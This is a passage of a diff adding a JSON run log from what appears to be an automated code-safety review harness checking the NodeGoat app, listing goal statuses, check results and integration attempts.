+            "status": "running",
+            "sessionId": "program-14494d741deff0512ffc76bf3fb973cef663fac2910e1756a531e2a887475c8c-data",
+            "workspace": "/home/user/deepseek-harness/.code-safety/NodeGoat-2026-09-19T20-49-35/repo/program-14494d741deff0512ffc76bf3fb973cef663fac2910e1756a531e2a887475c8c/data"
+          }
+        },
+        {
+          "type": "program/goal",
+          "data": {
+            "programId": "program-14494d741deff0512ffc76bf3fb973cef663fac2910e1756a531e2a887475c8c",
+            "key": "secrets",
+            "status": "certified",
+            "sessionId": "program-14494d741deff0512ffc76bf3fb973cef663fac2910e1756a531e2a887475c8c-secrets",
+            "workspace": "/home/user/deepseek-harness/.code-safety/NodeGoat-2026-09-19T20-49-35/repo/program-14494d741deff0512ffc76bf3fb973cef663fac2910e1756a531e2a887475c8c/secrets",
+            "revision": "ab07eb7f66ec83ebc2e70d233d3183e5ebaaeed7",
+            "tree": "0b5f6fb8abc2f2ce4dbded6a07fbdf456d893148"
+          }
+        },
+        {
+          "type": "program/goal",
+          "data": {
+            "programId": "program-14494d741deff0512ffc76bf3fb973cef663fac2910e1756a531e2a887475c8c",
+            "key": "dependencies",
+            "status": "running",
+            "sessionId": "program-14494d741deff0512ffc76bf3fb973cef663fac2910e1756a531e2a887475c8c-dependencies",
+            "workspace": "/home/user/deepseek-harness/.code-safety/NodeGoat-2026-09-19T20-49-35/repo/program-14494d741deff0512ffc76bf3fb973cef663fac2910e1756a531e2a887475c8c/dependencies"
+          }
+        },
+        {
+          "type": "program/goal",
+          "data": {
+            "programId": "program-14494d741deff0512ffc76bf3fb973cef663fac2910e1756a531e2a887475c8c",
+            "key": "access",
+            "status": "certified",
+            "sessionId": "program-14494d741deff0512ffc76bf3fb973cef663fac2910e1756a531e2a887475c8c-access",
+            "workspace": "/home/user/deepseek-harness/.code-safety/NodeGoat-2026-09-19T20-49-35/repo/program-14494d741deff0512ffc76bf3fb973cef663fac2910e1756a531e2a887475c8c/access",
+            "revision": "5810bef1061e74b4535fcf365ec7bbbff37a827e",
+            "tree": "ada70f7b760ba5bb635900f3917976983b7d7484"
+          }
+        },
+        {
+          "type": "program/goal",
+          "data": {
+            "programId": "program-14494d741deff0512ffc76bf3fb973cef663fac2910e1756a531e2a887475c8c",
+            "key": "platform",
+            "status": "running",
+            "sessionId": "program-14494d741deff0512ffc76bf3fb973cef663fac2910e1756a531e2a887475c8c-platform",
+            "workspace": "/home/user/deepseek-harness/.code-safety/NodeGoat-2026-09-19T20-49-35/repo/program-14494d741deff0512ffc76bf3fb973cef663fac2910e1756a531e2a887475c8c/platform"
+          }
+        },
+        {
+          "type": "program/goal",
+          "data": {
+            "programId": "program-14494d741deff0512ffc76bf3fb973cef663fac2910e1756a531e2a887475c8c",
+            "key": "data",
+            "status": "certified",
+            "sessionId": "program-14494d741deff0512ffc76bf3fb973cef663fac2910e1756a531e2a887475c8c-data",
+            "workspace": "/home/user/deepseek-harness/.code-safety/NodeGoat-2026-09-19T20-49-35/repo/program-14494d741deff0512ffc76bf3fb973cef663fac2910e1756a531e2a887475c8c/data",
+            "revision": "f0cf406fec4e7c2465212bc129346caf01dc1d9d",
+            "tree": "c38f61f70388c8e67fc83591235559dc5a49ee13"
+          }
+        },
+        {
+          "type": "program/goal",
+          "data": {
+            "programId": "program-14494d741deff0512ffc76bf3fb973cef663fac2910e1756a531e2a887475c8c",
+            "key": "platform",
+            "status": "certified",
+            "sessionId": "program-14494d741deff0512ffc76bf3fb973cef663fac2910e1756a531e2a887475c8c-platform",
+            "workspace": "/home/user/deepseek-harness/.code-safety/NodeGoat-2026-09-19T20-49-35/repo/program-14494d741deff0512ffc76bf3fb973cef663fac2910e1756a531e2a887475c8c/platform",
+            "revision": "d2a3f28054a599aaf1f5b5321e4acbc23a9c3676",
+            "tree": "e469dd79e6c69289a706196de22c9f1c97ccc17a"
+          }
+        },
+        {
+          "type": "program/goal",
+          "data": {
+            "programId": "program-14494d741deff0512ffc76bf3fb973cef663fac2910e1756a531e2a887475c8c",
+            "key": "dependencies",
+            "status": "certified",
+            "sessionId": "program-14494d741deff0512ffc76bf3fb973cef663fac2910e1756a531e2a887475c8c-dependencies",
+            "workspace": "/home/user/deepseek-harness/.code-safety/NodeGoat-2026-09-19T20-49-35/repo/program-14494d741deff0512ffc76bf3fb973cef663fac2910e1756a531e2a887475c8c/dependencies",
+            "revision": "2b9d677085ac02010ef1d717b7d55102c7ce54b6",
+            "tree": "0f9c694bc9f42bd2a8fc22c7490226695cebdf60"
+          }
+        },
+        {
+          "type": "program/integration",
+          "data": {
+            "programId": "program-14494d741deff0512ffc76bf3fb973cef663fac2910e1756a531e2a887475c8c",
+            "status": "running"
+          }
+        },
+        {
+          "type": "program/integration",
+          "data": {
+            "programId": "program-14494d741deff0512ffc76bf3fb973cef663fac2910e1756a531e2a887475c8c",
+            "status": "certified",
+            "mergedRevision": "d9936acb74becdb1bcf318bf81f3e2542dc14ed8",
+            "sessionId": "program-14494d741deff0512ffc76bf3fb973cef663fac2910e1756a531e2a887475c8c-@integration",
+            "denied": [
+              "/home/user/deepseek-harness/.code-safety/NodeGoat-2026-09-19T20-49-35/repo/program-14494d741deff0512ffc76bf3fb973cef663fac2910e1756a531e2a887475c8c"
+            ]
+          }
+        },
+        {
+          "type": "program/goal",
+          "data": {
+            "programId": "program-14494d741deff0512ffc76bf3fb973cef663fac2910e1756a531e2a887475c8c",
+            "key": "secrets",
+            "status": "merged",
+            "sessionId": "program-14494d741deff0512ffc76bf3fb973cef663fac2910e1756a531e2a887475c8c-secrets",
+            "workspace": "/home/user/deepseek-harness/.code-safety/NodeGoat-2026-09-19T20-49-35/repo/program-14494d741deff0512ffc76bf3fb973cef663fac2910e1756a531e2a887475c8c/secrets",
+            "revision": "ab07eb7f66ec83ebc2e70d233d3183e5ebaaeed7",
+            "tree": "0b5f6fb8abc2f2ce4dbded6a07fbdf456d893148"
+          }
+        },
+        {
+          "type": "program/goal",
+          "data": {
+            "programId": "program-14494d741deff0512ffc76bf3fb973cef663fac2910e1756a531e2a887475c8c",
+            "key": "injection",
+            "status": "merged",
+            "sessionId": "program-14494d741deff0512ffc76bf3fb973cef663fac2910e1756a531e2a887475c8c-injection",
+            "workspace": "/home/user/deepseek-harness/.code-safety/NodeGoat-2026-09-19T20-49-35/repo/program-14494d741deff0512ffc76bf3fb973cef663fac2910e1756a531e2a887475c8c/injection",
+            "revision": "683e56d85a58bb9fa827bb46b96f00b4f9ddfc34",
+            "tree": "f134006b71bedbb4ebab836e18afeb656dcaeb49"
+          }
+        },
+        {
+          "type": "program/goal",
+          "data": {
+            "programId": "program-14494d741deff0512ffc76bf3fb973cef663fac2910e1756a531e2a887475c8c",
+            "key": "access",
+            "status": "merged",
+            "sessionId": "program-14494d741deff0512ffc76bf3fb973cef663fac2910e1756a531e2a887475c8c-access",
+            "workspace": "/home/user/deepseek-harness/.code-safety/NodeGoat-2026-09-19T20-49-35/repo/program-14494d741deff0512ffc76bf3fb973cef663fac2910e1756a531e2a887475c8c/access",
+            "revision": "5810bef1061e74b4535fcf365ec7bbbff37a827e",
+            "tree": "ada70f7b760ba5bb635900f3917976983b7d7484"
+          }
+        },
+        {
+          "type": "program/goal",
+          "data": {
+            "programId": "program-14494d741deff0512ffc76bf3fb973cef663fac2910e1756a531e2a887475c8c",
+            "key": "data",
+            "status": "merged",
+            "sessionId": "program-14494d741deff0512ffc76bf3fb973cef663fac2910e1756a531e2a887475c8c-data",
+            "workspace": "/home/user/deepseek-harness/.code-safety/NodeGoat-2026-09-19T20-49-35/repo/program-14494d741deff0512ffc76bf3fb973cef663fac2910e1756a531e2a887475c8c/data",
+            "revision": "f0cf406fec4e7c2465212bc129346caf01dc1d9d",
+            "tree": "c38f61f70388c8e67fc83591235559dc5a49ee13"
+          }
+        },
+        {
+          "type": "program/goal",
+          "data": {
+            "programId": "program-14494d741deff0512ffc76bf3fb973cef663fac2910e1756a531e2a887475c8c",
+            "key": "dependencies",
+            "status": "merged",
+            "sessionId": "program-14494d741deff0512ffc76bf3fb973cef663fac2910e1756a531e2a887475c8c-dependencies",
+            "workspace": "/home/user/deepseek-harness/.code-safety/NodeGoat-2026-09-19T20-49-35/repo/program-14494d741deff0512ffc76bf3fb973cef663fac2910e1756a531e2a887475c8c/dependencies",
+            "revision": "2b9d677085ac02010ef1d717b7d55102c7ce54b6",
+            "tree": "0f9c694bc9f42bd2a8fc22c7490226695cebdf60"
+          }
+        },
+        {
+          "type": "program/goal",
+          "data": {
+            "programId": "program-14494d741deff0512ffc76bf3fb973cef663fac2910e1756a531e2a887475c8c",
+            "key": "platform",
+            "status": "merged",
+            "sessionId": "program-14494d741deff0512ffc76bf3fb973cef663fac2910e1756a531e2a887475c8c-platform",
+            "workspace": "/home/user/deepseek-harness/.code-safety/NodeGoat-2026-09-19T20-49-35/repo/program-14494d741deff0512ffc76bf3fb973cef663fac2910e1756a531e2a887475c8c/platform",
+            "revision": "d2a3f28054a599aaf1f5b5321e4acbc23a9c3676",
+            "tree": "e469dd79e6c69289a706196de22c9f1c97ccc17a"
+          }
+        },
+        {
+          "type": "program/end",
+          "data": {
+            "programId": "program-14494d741deff0512ffc76bf3fb973cef663fac2910e1756a531e2a887475c8c",
+            "outcome": "released",
+            "mergedRevision": "d9936acb74becdb1bcf318bf81f3e2542dc14ed8"
+          }
+        }
+      ],
+      "signoffs": [
+        "spec-freeze",
+        "release"
+      ]
+    }
+  ],
+  "members": [
+    {
+      "sessionId": "program-14494d741deff0512ffc76bf3fb973cef663fac2910e1756a531e2a887475c8c-access",
+      "programId": "program-14494d741deff0512ffc76bf3fb973cef663fac2910e1756a531e2a887475c8c",
+      "key": "access",
+      "certified": true,
+      "caps": {
+        "maxTotalTokens": 4000000,
+        "maxWallMs": 2400000
+      },
+      "runs": [
+        {
+          "attempt": 1,
+          "verdict": "passed",
+          "results": [
+            {
+              "checkId": "access-findings",
+              "status": "pass"
+            },
+            {
+              "checkId": "access-section",
+              "status": "pass"
+            }
+          ]
+        }
+      ],
+      "directives": []
+    },
+    {
+      "sessionId": "program-14494d741deff0512ffc76bf3fb973cef663fac2910e1756a531e2a887475c8c-data",
+      "programId": "program-14494d741deff0512ffc76bf3fb973cef663fac2910e1756a531e2a887475c8c",
+      "key": "data",
+      "certified": true,
+      "caps": {
+        "maxTotalTokens": 4000000,
+        "maxWallMs": 2400000
+      },
+      "runs": [
+        {
+          "attempt": 1,
+          "verdict": "passed",
+          "results": [
+            {
+              "checkId": "data-findings",
+              "status": "pass"
+            },
+            {
+              "checkId": "data-section",
+              "status": "pass"
+            }
+          ]
+        }
+      ],
+      "directives": []
+    },
+    {
+      "sessionId": "program-14494d741deff0512ffc76bf3fb973cef663fac2910e1756a531e2a887475c8c-dependencies",
+      "programId": "program-14494d741deff0512ffc76bf3fb973cef663fac2910e1756a531e2a887475c8c",
+      "key": "dependencies",
+      "certified": true,
+      "caps": {
+        "maxTotalTokens": 4000000,
+        "maxWallMs": 2400000
+      },
+      "runs": [
+        {
+          "attempt": 1,
+          "verdict": "passed",
+          "results": [
+            {
+              "checkId": "dependencies-findings",
+              "status": "pass"
+            },
+            {
+              "checkId": "dependencies-section",
+              "status": "pass"
+            }
+          ]
+        }
+      ],
+      "directives": []
+    },
+    {
+      "sessionId": "program-14494d741deff0512ffc76bf3fb973cef663fac2910e1756a531e2a887475c8c-injection",
+      "programId": "program-14494d741deff0512ffc76bf3fb973cef663fac2910e1756a531e2a887475c8c",
+      "key": "injection",
+      "certified": true,
+      "caps": {
+        "maxTotalTokens": 4000000,
+        "maxWallMs": 2400000
+      },
+      "runs": [
+        {
+          "attempt": 1,
+          "verdict": "passed",
+          "results": [
+            {
+              "checkId": "injection-findings",
+              "status": "pass"
+            },
+            {
+              "checkId": "injection-section",
+              "status": "pass"
+            }
+          ]
+        }
+      ],
+      "directives": []
+    },
+    {
+      "sessionId": "program-14494d741deff0512ffc76bf3fb973cef663fac2910e1756a531e2a887475c8c-platform",
+      "programId": "program-14494d741deff0512ffc76bf3fb973cef663fac2910e1756a531e2a887475c8c",
+      "key": "platform",
+      "certified": true,
+      "caps": {
+        "maxTotalTokens": 4000000,
+        "maxWallMs": 2400000
+      },
+      "runs": [
+        {
+          "attempt": 1,
+          "verdict": "passed",
+          "results": [
+            {
+              "checkId": "platform-findings",
+              "status": "pass"
+            },
+            {
+              "checkId": "platform-section",
+              "status": "pass"
+            }
+          ]
+        }
+      ],
+      "directives": []
+    },
+    {
+      "sessionId": "program-14494d741deff0512ffc76bf3fb973cef663fac2910e1756a531e2a887475c8c-secrets",
+      "programId": "program-14494d741deff0512ffc76bf3fb973cef663fac2910e1756a531e2a887475c8c",
+      "key": "secrets",
+      "certified": true,
+      "caps": {
+        "maxTotalTokens": 4000000,
+        "maxWallMs": 2400000
+      },
+      "runs": [
+        {
+          "attempt": 1,
+          "verdict": "passed",
+          "results": [
+            {
+              "checkId": "secrets-findings",
+              "status": "pass"
+            },
+            {
+              "checkId": "secrets-section",
+              "status": "pass"
+            }
+          ]
+        }
+      ],
+      "directives": []
+    },
+    {
+      "sessionId": "program-14494d741deff0512ffc76bf3fb973cef663fac2910e1756a531e2a887475c8c-@integration",
+      "programId": "program-14494d741deff0512ffc76bf3fb973cef663fac2910e1756a531e2a887475c8c",
+      "key": "@integration",
+      "certified": true,
+      "runs": [
+        {
+          "attempt": 1,
+          "verdict": "failed",
+          "results": [
+            {
+              "checkId": "safety-report",
+              "status": "fail"
+            },
+            {
+              "checkId": "gate-1",
+              "status": "pass"
+            },
+            {
+              "checkId": "gate-2",
+              "status": "fail"
+            }
+          ]
+        },
+        {
+          "attempt": 2,
+          "verdict": "passed",
+          "results": [
+            {
+              "checkId": "safety-report",
+              "status": "pass"
+            },
+            {
+              "checkId": "gate-1",
+              "status": "pass"
+            },
+            {
+              "checkId": "gate-2",
+              "status": "pass"
+            }
+          ]
+        }
+      ],
+      "directives": [
+        "2 of this goal's checks did not pass"
+      ]
+    }
+  ]
+}
